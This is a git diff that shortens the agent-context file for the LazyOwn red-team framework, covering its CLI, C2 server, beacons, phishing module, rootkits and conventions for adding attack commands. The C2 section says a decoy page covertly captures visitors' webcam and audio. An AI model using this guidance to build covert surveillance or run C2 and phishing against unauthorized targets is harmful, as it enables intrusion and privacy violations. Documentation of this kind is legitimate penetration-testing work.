@@ -1,985 +1,539 @@
 # CLAUDE.md — LazyOwn RedTeam Framework
 
-This file is the durable, version-controlled context every Claude session must read before
-touching this repository. It uses prompt engineering, context engineering and
-spec-driven development with explicit happy paths and sad paths so that any agent — human
-or model — can produce changes that fit the framework instead of fighting it.
-
-> Audience: Claude (Sonnet/Opus) operating via Claude Code, the LazyOwn MCP server,
-> or the `lazyown` skill. Source of truth for code lives in `lazyown.py`, `lazyc2.py`,
-> `utils.py`, `payload.json`, and the `skills/`, `modules/`, `templates/` directories.
+Durable context for any Claude/agent touching this repo. Source of truth: `lazyown.py`, `lazyc2.py`, `utils.py`, `payload.json`, `skills/`, `modules/`, `templates/`.
 
 ---
 
-## 0. North Star — what LazyOwn is
+## 0. What LazyOwn is
 
-LazyOwn is a professional **red team / penetration testing framework**. It bundles:
+Professional red-team / pentest framework:
+- **CLI** (`lazyown.py`): cmd2 shell, ~27k LOC, 333+ commands + 200+ aliases, kill-chain coverage.
+- **C2** (`lazyc2.py`): Flask + Jinja2 + Socket.IO, 84+ routes, 55+ templates, malleable HTTP profiles, XOR-stub Go beacon, multi-operator `/collab/`, phishing (SQLite + Groq).
+- **Utils** (`utils.py`): ~138 helpers (config, ANSI, NVD/ExploitAlert/PacketStorm scrapers, ARP, certs).
+- **Skills** (`skills/`): MCP server (~95 tools), autonomous daemon, hive-mind, MoE+RL SWAN, parquet KB, policy engine, Groq/Ollama agents.
+- **Extensions**: `lazyaddons/*.yaml` (declarative tools), `plugins/*.lua` (lupa), `tools/*.tool` (pwntomate auto-jobs).
+- **Linux BOF beacon**: `lazyaddons/blacksandbeacon*.yaml` — only OSS C2 with Linux BOF via ELF `dlopen`.
 
-- A **cmd2-based interactive CLI** (`lazyown.py`) with 333+ attack commands and
-  200+ aliases covering the full kill chain.
-- A **Flask + Jinja2 + Socket.IO C2 server** (`lazyc2.py`) with 84+ routes, 55+
-  templates, malleable HTTP profiles, an XOR-stub Go beacon, a multi-operator
-  collaboration layer (`/collab/`), and a phishing module backed by SQLite + Groq AI.
-- A shared **utility layer** (`utils.py`) with ~138 helpers: payload loading, ANSI
-  output, prompt rendering, key/cert generation, NVD/ExploitAlert/PacketStorm
-  scrapers, ARP spoofing primitives, etc.
-- A **skills layer** (`skills/`) hosting the **MCP server**, autonomous daemon,
-  hive-mind multi-agent system, MoE+RL SWAN orchestrator, parquet knowledge
-  base, policy engine, and Groq/Ollama agents.
-- An **extension layer**: `lazyaddons/*.yaml` (declarative tool integration),
-  `plugins/*.lua` (Lua scripting via lupa), and `tools/*.tool` (pwntomate
-  service-triggered jobs).
-- A **Linux BOF beacon family** (`lazyaddons/blacksandbeacon.yaml` +
-  `lazyaddons/blacksandbeacon_bof.yaml`) — the only open-source C2 with
-  Linux Beacon Object File support via ELF `dlopen` injection.
-
-The **MCP layer sits on top of everything** and exposes ~95 `lazyown_*` tools to
-Claude Code. The CLI uses **cmd2**. The C2 uses **Flask** with **Jinja2**.
+MCP sits on top and exposes `lazyown_*` tools to Claude Code.
 
 ---
 
-## 1. Entry points and how to launch
-
-### Launching the framework — `./run`
+## 1. Entry points
 
 ```sh
-./run                       # interactive shell
-./run --no-banner           # quiet
-./run -s                    # require sudo
-./run -p sessions/foo.json  # alternate payload
-./run -c 'lazynmap'         # exec one command then exit
-```
-
-`./run` is a thin shell wrapper that:
-1. Activates the virtualenv at `env/`.
-2. Executes `python3 -W ignore lazyown.py "$@"`.
-
-`lazyown.py` is **the only entrypoint that should be launched directly by the
-operator**. All other Python files are imported, executed via `do_run`, called
-from MCP, or spawned by the autonomous daemon — never invoked manually.
-
-### Full-stack launch — `fast_run_as_r00t.sh`
-
-`bash fast_run_as_r00t.sh --no-attach --vpn 1` runs **as root** inside a tmux
-session named `lazyown_sessions`:
-- Starts the C2 (`lazyc2.py`) on `lhost:c2_port` with self-signed TLS.
-- Spawns nmap recon and the auto-loop selector cascade.
-- `sleep_start` (default `333` seconds, see `payload.json`) MUST elapse before
-  the loop fires its first command — never timeout below that value.
-
-### MCP — Claude Code integration
-
-```sh
+./run [--no-banner] [-s] [-p sessions/foo.json] [-c 'cmd']   # cmd2 shell
+bash fast_run_as_r00t.sh --no-attach --vpn 1                 # full stack in tmux 'lazyown_sessions'
 claude mcp add lazyown python3 /home/grisun0/LazyOwn/skills/lazyown_mcp.py
+bash skills/mcp_restart.sh                                   # after editing MCP code
 ```
 
-After registration, restart with `bash skills/mcp_restart.sh` after any code
-change that affects `skills/lazyown_mcp.py` or modules imported at startup.
+- `./run` activates `env/` venv then runs `python3 -W ignore lazyown.py`.
+- **Only** `lazyown.py` is launched directly; other Python files are imported / executed via `do_run` / called from MCP / spawned by daemon.
+- `fast_run_as_r00t.sh` runs as root: starts C2 on `lhost:c2_port` w/ self-signed TLS, nmap recon, auto-loop. `sleep_start` (default `333`s, see `payload.json`) **must** elapse before first loop fire — never timeout below it.
 
 ---
 
-## 2. Repository map — where things live
+## 2. Repo map
 
 | Path | Role |
 |------|------|
-| `lazyown.py` | cmd2 shell, ~27k LOC. Defines `class LazyOwnShell(cmd2.Cmd)` and ~280 `do_*` commands. Single source of truth for the CLI. |
-| `lazyc2.py` | Flask + Socket.IO C2 server, 84 routes, decoy site, phishing blueprint, dashboard, terminal, listener, /pty xterm. |
-| `utils.py` | Shared helpers (`Config`, `load_payload`, `getprompt`, `print_msg`, `run_command`, `xor_encrypt_decrypt`, `generate_certificates`, ANSI constants, etc.). |
-| `payload.json` | The **only** runtime configuration file. Keys are read by every component. Persists across runs. |
-| `templates/` | 55+ Jinja2 templates. Root templates extend `base.html`. Subdirs: `phishing/`, `landing_pages/`, `emails/`. |
-| `static/` | CSS/JS assets (`xterm.js`, `particles.js`), icons for network graph, `body_report.json` (PDF report fields). |
-| `modules/` | 50+ Python modules: LLM clients, `collab_bp`, `dashboard_bp`, world model, obs parser, playbook engine, etc. |
-| `modules/integrations/` | Third-party bridges: MISP export, Nuclei scanner, Searchsploit wrapper. |
-| `modules/backdoor/` | C reverse-shell backdoor source + Makefile. |
-| `modules/rootkit/` | Linux kernel module rootkit research code. |
-| `modules/win_rootkit/` | Windows ring-3 rootkit (C/C++/C#) for cross-compiled testing. |
-| `skills/` | MCP server (95 tools) + autonomous AI stack: daemon, hive_mind, swan, policy, parquet_db. |
-| `sessions/` | Authoritative campaign state — **gitignored**, never delete without confirmation. `git add -f` required for any file here. |
-| `parquets/` | Columnar knowledge bases: GTFOBins, LOLBas, MITRE ATT&CK techniques (6 `.parquet` files). |
-| `plugins/` | Lua plugins (lupa/LuaJIT runtime). Each `.lua` + companion `.yaml` metadata. |
-| `lazyaddons/` | 76 declarative YAML tool integrations. Auto-discovered at startup. |
-| `tools/` | 69 pwntomate `.tool` files auto-triggered on nmap-discovered services. |
-| `external/` | Vendored upstreams (atomic-red-team, etc.). Excluded from git. |
-| `lazyscripts/` | 11 `.ls` recipe scripts loaded with `run_script`. |
-| `playbooks/` | YAML APT simulation playbooks (7 threat actors) consumed by `apt_playbook`. |
-| `lazyadversaries/` | YAML threat actor profiles used by the autonomous daemon's adversary selector. |
-| `cli/` | Shell-layer extensions: wizard, graph advisor, reactive hints, dashboard TUI, fuzzy picker, palette, aliases. Zero imports from `lazyown.py`. |
-| `cli/commands/` | cmd2 `CommandSet` subpackage. Auto-discovered by `cli/registry.py`. |
-| `core/` | Canonical `Config` class, crypto primitives, validators, `typing.Protocol` interfaces. No framework imports. |
-| `scripts/` | Build/maintenance scripts: `build_command_index.py`, `patch_playbook_atomic_ids.py`, `update_apt_atomic_ids.py`. |
-| `tests/` | 23 test files, ~450 tests total. No mocking of C2 or daemon. |
-| `lazyown-docker/` | Dockerfile, docker-compose, sandbox mode support. |
-| `lazygui/` | Desktop GUI application (separate from the Textual TUI in `cli/`). |
-| `modules_ext/` | External subprojects: `lazyown_infinitestorage/`, `rustrevmaker/`. **Gitignored** — `git add -f` required. |
-| `docs/` | Static site for GitHub Pages. Auto-generated by `DEPLOY.sh` from Markdown sources — do not edit HTML directly. |
-| `lazyc2/` | Security validators (`validate_route_path`, `validate_template_name`, `is_safe_template_path`) imported by `lazyc2.py`. |
-| `vpn/` | VPN config files (`.ovpn`, `.conf`). **Gitignored** — `git add -f` required. Never commit VPN credentials. |
-| `banners/` | Banner image assets for the CLI banner display. |
-| `source/` | Source artwork and design assets. |
-| `QUICKSTART.md` | Canonical 5-minute onboarding guide (clone → wizard → recon → C2 → beacon → collab). **Do not auto-generate**; update manually when the operator flow changes. |
+| `lazyown.py` | cmd2 shell `LazyOwnShell(cmd2.Cmd)`; ~280 `do_*`. Single CLI source. |
+| `lazyc2.py` | Flask + Socket.IO C2, decoy site, phishing bp, dashboard, /pty xterm. |
+| `utils.py` | Shared helpers + `Config`, `VulnerabilityScanner`, `MyServer`, `IP2ASN`. |
+| `payload.json` | **Only** runtime config. Read by every component. |
+| `templates/` | 55+ Jinja2; extend `base.html`. Subdirs: `phishing/`, `landing_pages/`, `emails/`. |
+| `static/` | CSS/JS (xterm.js, particles.js), icons, `body_report.json`. |
+| `modules/` | 50+ modules: LLM clients, `collab_bp`, `dashboard_bp`, world model, playbook engine. |
+| `modules/integrations/` | MISP export, Nuclei, Searchsploit. |
+| `modules/backdoor/` `modules/rootkit/` `modules/win_rootkit/` | C/C++/C# implants & rootkits. |
+| `skills/` | MCP server + autonomous daemon + hive_mind + swan + policy + parquet_db. |
+| `sessions/` | Campaign state — **gitignored**, never delete w/o confirmation. `git add -f` to stage. |
+| `parquets/` | Columnar KBs: GTFOBins, LOLBas, MITRE ATT&CK (6 `.parquet`). |
+| `plugins/` | Lua plugins (lupa). Each `.lua` + `.yaml` metadata. |
+| `lazyaddons/` | 76 YAML tool integrations. Auto-discovered. |
+| `tools/` | 69 pwntomate `.tool` files; auto-trigger on nmap services. |
+| `external/` `modules_ext/` `vpn/` | **Gitignored**; `git add -f` required. Never commit creds. |
+| `lazyscripts/` `playbooks/` `lazyadversaries/` | `.ls` recipes, YAML APT playbooks (7 actors), threat profiles. |
+| `cli/` | Shell extensions: wizard, graph advisor, reactive hints, dashboard TUI, palette. Zero imports from `lazyown.py`. |
+| `cli/commands/` | cmd2 `CommandSet` subpkg, auto-discovered by `cli/registry.py`. |
+| `core/` | Canonical `Config`, crypto, validators, `typing.Protocol` interfaces. No framework imports. |
+| `scripts/` | Build/maintenance: `build_command_index.py`, `patch_playbook_atomic_ids.py`. |
+| `tests/` | 23 files, ~450 tests. No mocking of C2 or daemon. |
+| `lazyown-docker/` `lazygui/` | Docker + desktop GUI. |
+| `docs/` | GH Pages site — auto-generated by `DEPLOY.sh`, don't edit HTML. |
+| `lazyc2/` | Security validators (`validate_route_path`, `validate_template_name`, `is_safe_template_path`). |
+| `banners/` `source/` | Banner / artwork. |
+| `QUICKSTART.md` | Canonical 5-min onboarding. Manual; update when operator flow changes. |
 
-### Directory README convention
-
-**Every directory in this repository has a `README.md`.** When adding a new
-directory, create its README immediately. A directory without a README will be
-flagged in code review.
-
-README content rules (same as §10 for code):
-- English only, no emojis, human language.
-- File/subdirectory table explaining the role of each item.
-- "How it works" section for non-obvious mechanics.
-- "Adding X" section for any directory that is an extension point.
-- No generated content — write prose that a human would find useful six months
-  from now without any context from this conversation.
-
-### Gitignored directories
-
-These directories are in `.gitignore` and require `git add -f <path>` to stage
-any file inside them:
-
-- `sessions/` — engagement state (credentials, scan output, beacons)
-- `vpn/` — VPN configuration files
-- `modules_ext/` — external module subprojects
-- `external/` — vendored upstreams
-
-Use `git add -f` consciously. Never use it for credential files, TLS keys,
-or `payload.json`.
+**Every directory has a `README.md`.** Create one immediately when adding a new dir. Rules per §10: English-only, no emojis, file/subdir table, "How it works" + "Adding X" sections, no generated content.
 
 ---
 
-## 3. The `payload.json` contract — single source of configuration
+## 3. `payload.json` — single config source
 
-`payload.json` is loaded by `utils.load_payload()` and wrapped in `class Config`
-(see `utils.py:3229`). Every component — CLI, C2, MCP, agents — reads from this
-one file. **Nothing is hardcoded; nothing is duplicated; if a value would be
-used in more than one place, it lives here.**
+Loaded by `utils.load_payload()`, wrapped by `class Config` (`utils.py:3229`). Every component reads here. **Nothing hardcoded; nothing duplicated; if reused → goes here.**
 
-Critical keys (full list in `payload.json`):
+Critical keys:
 
 | Key | Purpose |
 |-----|---------|
-| `rhost`, `lhost`, `rport`, `lport` | Target / attacker IPs and ports |
-| `c2_port`, `c2_user`, `c2_pass` | C2 listener socket and basic auth |
+| `rhost`, `lhost`, `rport`, `lport` | Target/attacker IPs+ports |
+| `c2_port`, `c2_user`, `c2_pass` | C2 socket + basic auth |
 | `domain`, `subdomain`, `os_id` | Target context (os_id 1=lin/2=win) |
-| `start_user`, `start_pass` | Initial creds, auto-injected when discovered |
+| `start_user`, `start_pass` | Initial creds (auto-injected on discovery) |
 | `wordlist`, `usrwordlist`, `dirwordlist`, `dnswordlist`, `iiswordlist` | SecLists paths |
-| `c2_maleable_route` | URI prefix beacons use (default `/pleasesubscribe/v1/users/`) |
-| `user_agent_*`, `url_trafic_*` | Malleable C2 profile overrides |
-| `sleep`, `sleep_start` | Beacon jitter and auto-loop bootstrap delay |
-| `api_key` | Groq key (used by report.py and AI agents) |
-| `enable_telegram_c2`, `enable_discord_c2`, `enable_ia`, `enable_deepseek`, `enable_cloudflare`, `run_in_memory`, `enable_c2_implant_debug`, `enable_c2_debug` | Boolean feature flags |
+| `c2_maleable_route` | Beacon URI prefix (default `/pleasesubscribe/v1/users/`) |
+| `user_agent_*`, `url_trafic_*` | Malleable C2 profile |
+| `sleep`, `sleep_start` | Beacon jitter + auto-loop bootstrap delay |
+| `api_key` | Groq (used by `report.py`, AI agents) |
+| `enable_telegram_c2`/`discord_c2`/`ia`/`deepseek`/`cloudflare`/`run_in_memory`/`c2_implant_debug`/`c2_debug` | Feature flags |
 | `c2_daily_limit`, `c2_hour_limit`, `c2_login_limit` | flask-limiter strings |
-| `targets` | Multi-target list with status, ports, tags, notes |
-| `rat_key` | XOR key for stub/beacon encoding |
-| `device`, `startip`, `endip` | Network discovery range |
+| `targets` | Multi-target list (status, ports, tags, notes) |
+| `rat_key` | XOR key for stub/beacon |
+| `device`, `startip`, `endip` | Net discovery range |
 
-### Reading vs writing config
+**Read/write:**
+- CLI in-process: `self.params[key]` (saved back via `do_assign`/`do_set`).
+- External: `from utils import Config, load_payload; cfg = Config(load_payload())`.
+- MCP: `lazyown_get_config()` / `lazyown_set_config(key, value)`.
 
-- **CLI in-process**: `self.params[key]` (set by `do_assign`/`do_set`, written
-  back to `payload.json` on save).
-- **External code**: `from utils import Config, load_payload; cfg = Config(load_payload())`.
-- **MCP**: `lazyown_get_config()` / `lazyown_set_config(key, value)`.
-
-If a value needs to persist across processes (CLI ↔ C2 ↔ daemon ↔ MCP), it
-**must** go through `payload.json`. Do not invent ad-hoc JSON files unless they
-represent a genuinely different domain (e.g. `sessions/world_model.json`,
-`sessions/tasks.json`, `sessions/objectives.jsonl`).
+Cross-process state → must go through `payload.json`. Don't invent JSON files unless a genuinely different domain (e.g. `sessions/world_model.json`, `tasks.json`, `objectives.jsonl`).
 
 ---
 
-## 4. Architecture in one picture
+## 4. Architecture
 
 ```
-┌────────────────────────────────────────────────────────────────┐
-│                         operator / Claude                      │
-└──────┬───────────────────────┬────────────────────┬────────────┘
-       │ ./run                 │ MCP                │ Web UI / phishing
-       ▼                       ▼                    ▼
- ┌─────────────┐       ┌──────────────────┐   ┌───────────────────┐
- │ lazyown.py  │◄──────│ skills/lazyown_  │   │   lazyc2.py       │
- │ (cmd2 CLI)  │       │ mcp.py (~95 fns) │   │ Flask + Socket.IO │
- │ class       │       └────────┬─────────┘   │ + Jinja2 + DNS    │
- │ LazyOwn-    │                │             │ + xterm /pty      │
- │ Shell       │                ▼             └─────────┬─────────┘
- └──────┬──────┘       ┌──────────────────┐             │
-        │              │ skills/          │             │
-        │              │ - autonomous_    │             │
-        │              │   daemon         │             │
-        │              │ - hive_mind      │             │
-        │              │ - swan_agent     │             │
-        │              │ - lazyown_policy │             │
-        │              │ - parquet_db     │             │
-        │              └────────┬─────────┘             │
-        │                       │                       │
-        ▼                       ▼                       ▼
-        ┌────────────────────────────────────────────────────┐
-        │   utils.py (Config, load_payload, run_command, …)  │
-        ├────────────────────────────────────────────────────┤
-        │   payload.json   (single source of configuration)  │
-        ├────────────────────────────────────────────────────┤
-        │   sessions/      (authoritative campaign state)    │
-        │   parquets/      (knowledge bases)                 │
-        │   templates/     (Jinja2)                          │
-        │   modules/, plugins/, lazyaddons/, tools/          │
-        └────────────────────────────────────────────────────┘
+operator/Claude ──► ./run ─► lazyown.py (cmd2)
+                ──► MCP   ─► skills/lazyown_mcp.py (~95 fns) ─► skills/{daemon,hive_mind,swan,policy,parquet_db}
+                ──► Web   ─► lazyc2.py (Flask+SocketIO+Jinja2, /pty, DNS)
+                                        │
+                       all ──► utils.py (Config, run_command, …) ──► payload.json
+                                        │
+                                  sessions/ · parquets/ · templates/ · modules/ · plugins/ · lazyaddons/ · tools/
 ```
 
-`lazyown.py` and `lazyc2.py` both import from `utils.py` and read `payload.json`.
-The MCP server reuses `LazyOwnShell` to execute commands — there is no second
-implementation of the CLI.
+CLI and C2 both import `utils.py` + read `payload.json`. MCP reuses `LazyOwnShell` — no second CLI implementation.
 
 ---
 
-## 5. CLI — `lazyown.py` (cmd2)
+## 5. CLI conventions (`lazyown.py`)
 
-### Conventions
-
-- Class: `LazyOwnShell(cmd2.Cmd)` — one class, one shell. Subclass `CommandSet`
-  only if a feature is meaningfully orthogonal (rarely needed; existing commands
-  go on the main class).
-- Command method: `do_<name>(self, line)` — name is the CLI verb.
-- Help string: a docstring on the method. cmd2 surfaces it via `help <name>`.
-- Argument parsing: prefer `@with_argparser(parser)` for any non-trivial flag
-  set; use `@with_argument_list` for simple split.
-- Categories: `@with_category('Recon')` etc. Keep the existing category names.
-- Aliases: register in the `aliases` dict at class level (see lines ~114-260).
-  Aliases that need `payload.json` values use `f""` strings interpolated at
-  class-body load time — this is intentional; they refresh on shell restart.
-- Persistent params: `self.params` is the in-memory mirror of `payload.json`.
-  Always write back via the existing `do_assign` / `do_set` flow so changes
-  survive restart.
+- One class `LazyOwnShell(cmd2.Cmd)`. Subclass `CommandSet` only when meaningfully orthogonal.
+- Methods `do_<name>(self, line)`; docstring = `help <name>`.
+- Args: `@with_argparser(parser)` for non-trivial; `@with_argument_list` for simple split.
+- `@with_category('Recon')` etc. — keep existing names.
+- Aliases: `aliases` dict at class level; payload-derived aliases use class-body `f""` (refresh on shell restart).
+- `self.params` mirrors `payload.json`. Write back via `do_assign`/`do_set` only.
 
 ### Adding a command — happy path
+1. Place near related commands in right category.
+2. Read inputs from `self.params` — never accept `rhost`/`lhost`/etc. as positional when in payload.
+3. Validate with `check_rhost`/`check_lhost`/`check_lport` (utils).
+4. Execute via `run_command(cmd_str)` — captures output, strips ANSI, CSV-logs.
+5. Artefacts → `sessions/...` with stable filenames.
+6. Add **one** natural short alias (or none).
+7. MCP exposes every `do_*` via `lazyown_run_command` automatically.
+8. If new command has a phase, add to bridge catalog (`modules/c2_profile.py` or wherever `BridgeSelector` reads) so auto-loop sees it.
 
-1. Pick the right phase category and place the new method near related commands.
-2. Read every input from `self.params` — never accept `rhost`/`lhost`/etc. as a
-   positional argument when the value is in `payload.json`.
-3. Validate with `check_rhost` / `check_lhost` / `check_lport` from `utils.py`.
-4. Execute via `run_command(cmd_str)` (utils) so output is captured, ANSI is
-   stripped for logs, and CSV logging fires.
-5. Write artefacts to `sessions/...` using stable, documented filenames.
-6. Add an alias if there is a natural short form (and only one).
-7. If the new command should also be runnable from MCP, no extra work — MCP
-   exposes every `do_*` automatically through `lazyown_run_command`.
-8. If the new command has a phase, add it to the bridge catalog
-   (`modules/c2_profile.py` or wherever `BridgeSelector` reads from) so the
-   autonomous loop can find it.
+### Sad paths
+- Missing payload key → `check_rhost(...)` returns False → `print_error` + `return` (don't raise).
+- External binary missing → guard with `is_binary_present(name)`, `print_warn` w/ install instructions, don't fall back silently.
+- Long-running tool → never timeout below documented runtime (e.g. `lazynmap` ≥ 30 min); detach via `subprocess.Popen`, `print_msg` w/ artefact path.
+- OS mismatch → read `sessions/os.json` or `payload.json["os_id"]`; refuse Linux-only against Windows (daemon already enforces).
+- Sensitive output → never print secrets; write to `sessions/credentials*.txt` / `hash*.txt`.
 
-### Adding a command — sad paths
-
-- **Missing payload key** — call `check_rhost(rhost)` before use; if it returns
-  `False`, print an error and `return` (do not raise).
-- **External binary missing** — guard with `is_binary_present(name)` and emit a
-  `print_warn` with install instructions; do not silently fall back.
-- **Long-running tool** — never set a timeout below the documented runtime
-  (e.g. `lazynmap` ≥ 30 min). Detach with `subprocess.Popen` and emit a
-  `print_msg` pointing at the artefact path.
-- **OS mismatch** — read `sessions/os.json` (or `payload.json["os_id"]`) and
-  refuse if Linux-only command is invoked against a Windows target. The
-  fallback maps in the daemon already enforce this; the CLI should mirror it.
-- **Sensitive output** — never print secrets to stdout; write to
-  `sessions/credentials*.txt` or `sessions/hash*.txt` and tell the user where.
-
-### What NOT to do
-
-- Do not import `lazyc2` from CLI commands. The CLI must run without Flask.
-- Do not write to `payload.json` from anywhere except `do_assign`, `do_set`,
-  `lazyown_set_config`, and `auto_populate`. Concurrent writers race.
-- Do not hardcode a wordlist, port, or IP — use `self.params` keys.
-- Do not introduce a new `print_*` style; reuse `print_msg` / `print_warn` /
-  `print_error` from `utils.py` so colours and logging stay consistent.
+### Do NOT
+- Import `lazyc2` from CLI — CLI must run without Flask.
+- Write to `payload.json` outside `do_assign` / `do_set` / `lazyown_set_config` / `auto_populate` (race condition).
+- Hardcode wordlist/port/IP — use `self.params`.
+- Introduce new `print_*` style — use `print_msg`/`print_warn`/`print_error`.
 
 ---
 
-## 6. C2 — `lazyc2.py` (Flask + Jinja2 + Socket.IO)
+## 6. C2 (`lazyc2.py`)
 
-### Surface
-
-- `app = Flask(__name__, static_folder='static')` (line ~1610).
-- `socketio = SocketIO(app, async_mode='threading', transports=['websocket'])`
-  with namespaces `/listener`, `/pty`, `/terminal`.
-- `flask-limiter` enforces `c2_daily_limit`, `c2_hour_limit`, `c2_login_limit`
-  from `payload.json`.
-- 84 HTTP routes covering: landing/dashboard, malleable beacon protocol
-  (`/command/<client_id>`, `<route_maleable><client_id>`), file upload/download,
-  short-URL beacons, phishing campaigns, terminal/PTY, surface graph,
-  Bloodhound zip ingest, AI bots (chatbot/vuln/taskbot/script/redop/adversary),
-  and a JSON dashboard at `/api/dashboard`.
-- Blueprints registered at runtime: `phishing_bp`, `dashboard_bp` (under
-  `/dashboard`), `collab_bp` (under `/collab`).
-- Before registering `collab_bp`, `lazyc2.py` injects
-  `app.config["LAZYOWN_CONFIG"] = config` so the blueprint can read `lhost` and
-  `c2_port` via `current_app.config.get("LAZYOWN_CONFIG")` without importing
-  `utils.py` directly. This is the approved pattern for blueprints that need
-  payload values — do not pass them as module-level globals.
-- Auth: HTTP Basic via `requires_auth` (uses `c2_user` / `c2_pass`) plus
-  `flask-login` for the operator UI.
-- DNS server: `dnslib`-based custom resolver started in a daemon thread.
-- Watcher: `watchdog.Observer` reacting to file events configured in
-  `event_config.json`.
+- `app = Flask(__name__, static_folder='static')` (~line 1610).
+- `socketio = SocketIO(app, async_mode='threading', transports=['websocket'])`; namespaces `/listener`, `/pty`, `/terminal`.
+- `flask-limiter` from `c2_daily_limit`/`c2_hour_limit`/`c2_login_limit`.
+- 84 routes: landing/dashboard, malleable beacon protocol (`/command/<id>`, `<route_maleable><id>`), uploads, short-URL beacons, phishing, terminal/PTY, surface graph, Bloodhound zip, AI bots, JSON dashboard at `/api/dashboard`.
+- Blueprints: `phishing_bp`, `dashboard_bp` (`/dashboard`), `collab_bp` (`/collab`).
+- **Blueprint config pattern**: `lazyc2.py` sets `app.config["LAZYOWN_CONFIG"] = config` before `register_blueprint`. Blueprint reads via `current_app.config.get("LAZYOWN_CONFIG")` — do NOT pass module globals.
+- Auth: HTTP Basic via `requires_auth` (uses `c2_user`/`c2_pass`) + `flask-login` for operator UI.
+- DNS server: `dnslib` resolver in daemon thread.
+- Watcher: `watchdog.Observer` reading `event_config.json`.
 
 ### Adding a route — happy path
+1. Decide operator-only (`@requires_auth`) vs beacon-facing (apply both canonical path AND `f'{route_maleable}<...>'` alias).
+2. `render_template('foo.html', ctx=...)` — typed context, not raw request data.
+3. Validate paths/templates with `validate_route_path` + `validate_template_name` + `is_safe_template_path`. Never bypass.
+4. Persist via existing helpers:
+   - JSON: `load_routes`/`save_routes`, `load_short_urls`, etc. — atomic (`*.tmp` → `os.rename`, chmod 600).
+   - SQLite: `sqlite3.connect(DB_PATH)` inside `with` blocks.
+5. Log to `sessions/access.log` via `logger = logging.getLogger(__name__)`.
+6. Reuse existing Socket.IO namespaces.
+7. New Jinja2 → `templates/`, extend `base.html`, reuse `header.html`/`nav.html`/`footer.html`.
 
-1. Decide if the endpoint is **operator-only** (apply `@requires_auth`) or
-   **beacon-facing** (apply both the canonical path **and** the malleable
-   `f'{route_maleable}<...>'` alias as existing routes do).
-2. Render templates with `render_template('foo.html', ctx=...)`. Pass typed
-   context, not raw request data.
-3. Validate every path / template name with `validate_route_path`,
-   `validate_template_name`, and `is_safe_template_path` — these helpers exist
-   for a reason; never bypass them.
-4. Persist state via the existing helpers:
-   - JSON files: `load_routes` / `save_routes`, `load_short_urls`, etc., which
-     write atomically (`*.tmp` → `os.rename`) and chmod 600.
-   - SQLite: open/close via `sqlite3.connect(DB_PATH)` and `with` blocks.
-5. Log with `logger = logging.getLogger(__name__)` to `sessions/access.log`.
-6. If the new endpoint emits Socket.IO events, reuse the existing namespaces.
-7. New Jinja2 templates go in `templates/`. Extend `base.html`. Reuse
-   `header.html`, `nav.html`, `footer.html` partials.
+### Sad paths
+- Path traversal → always `is_safe_template_path` first; reject paths escaping `templates/`.
+- CSRF/auth bypass → beacon routes accept POST without CSRF (implants don't carry tokens), but operator mutations require auth + session cookie.
+- Decoy fall-through → non-`127.0.0.1`/`lhost` IPs hit `decoy()` → renders `decoy.html` (fake landing, captures webcam/audio). Never break this — operator routes must check auth AND origin.
+- Hardcoded ports → bind to `lport`/`c2_port` only.
+- TLS → `cert.pem`/`key.pem` from `gen_cert.sh`; always HTTPS in PROD.
+- Phishing routes → register on `phishing_bp` (template_folder `templates/phishing`), not `app`.
 
-### Adding a route — sad paths
-
-- **Path traversal** — always pass through `is_safe_template_path` before
-  `render_template`. Reject any path that escapes `templates/`.
-- **CSRF / auth bypass** — beacon routes accept POST without CSRF by design
-  (implants don't carry CSRF tokens), but operator UI mutations must require
-  auth and (where possible) a session cookie.
-- **Decoy fall-through** — when the request's IP is not 127.0.0.1 nor `lhost`,
-  the `decoy()` view renders `decoy.html` (a fake landing site that captures
-  webcam/audio). Do not break this: every operator-only route must check
-  authentication AND the request origin.
-- **Hardcoded ports** — bind to `lport` / `c2_port` from `payload.json`, never
-  literal numbers (the existing `app.run(host='0.0.0.0', port=lport, ...)` is
-  the pattern).
-- **TLS** — `cert.pem` / `key.pem` are generated by `gen_cert.sh`; the C2
-  always serves over HTTPS in PROD.
-- **Phishing routes** — register on `phishing_bp` (template_folder
-  `templates/phishing`), not on `app` directly.
-
-### Adding a Jinja2 template
-
-- Extend `base.html` and `{% include %}` the layout partials.
-- All user-facing strings must be escapable; mark `|safe` only when the input
-  is provably HTML you produced.
-- Template filenames are validated by `validate_template_name`
-  (`^[a-zA-Z0-9_-]+\.html$`). Keep that pattern.
+### Template rules
+- Extend `base.html`, `{% include %}` partials.
+- Mark `|safe` only when you produced the HTML.
+- Filenames match `validate_template_name`: `^[a-zA-Z0-9_-]+\.html$`.
 
 ---
 
-## 7. Shared utilities — `utils.py`
+## 7. `utils.py`
 
-`utils.py` is the **only** module both `lazyown.py` and `lazyc2.py` import from.
-It exposes ~138 functions plus the `Config`, `VulnerabilityScanner`, `MyServer`,
-`SimpleHTTPRequestHandler`, and `IP2ASN` classes.
-
-Use these instead of reinventing them:
+Only module both CLI and C2 import. Use existing helpers:
 
 | Need | Use |
 |------|-----|
-| Read `payload.json` | `load_payload()` then wrap in `Config(...)` |
-| ANSI coloured output | `print_msg`, `print_warn`, `print_error` |
-| Run a shell command and capture | `run_command(cmd)` |
-| XOR-encrypt for stub/beacon | `xor_encrypt_decrypt(data, key)` |
-| Generate self-signed TLS | `generate_certificates()` |
-| Enrich exploit search | `find_ss`, `find_ea`, `find_ps`, `nvddb`, `exploitalert`, `packetstormsecurity` |
-| HTTP request building | `generate_http_req(host, port, uri, ...)` |
-| Validate inputs | `check_rhost`, `check_lhost`, `check_lport` |
-| Tmux session bootstrap | `ensure_tmux_session(name)` |
-| Emails / users / passwords | `generate_emails`, `get_users_dic`, `crack_password` |
+| Read `payload.json` | `load_payload()` → `Config(...)` |
+| ANSI output | `print_msg`/`print_warn`/`print_error` |
+| Shell + capture | `run_command(cmd)` |
+| XOR | `xor_encrypt_decrypt(data, key)` |
+| Self-signed TLS | `generate_certificates()` |
+| Exploit search | `find_ss`/`find_ea`/`find_ps`/`nvddb`/`exploitalert`/`packetstormsecurity` |
+| HTTP req | `generate_http_req(host, port, uri, ...)` |
+| Input validation | `check_rhost`/`check_lhost`/`check_lport` |
+| Tmux bootstrap | `ensure_tmux_session(name)` |
+| Emails/users/creds | `generate_emails`/`get_users_dic`/`crack_password` |
 
-`utils.py` is intentionally large; keep new helpers here only when they are
-shared between the CLI and the C2. Single-feature helpers belong in
-`modules/<feature>.py`.
+New helpers go here only if shared CLI↔C2. Feature-local helpers → `modules/<feature>.py`.
 
-There are currently **two** `class Config` definitions in `utils.py` (3229 and
-3328). The second is a duplicate — do not add a third; if you must edit
-`Config`, deduplicate first in a separate change.
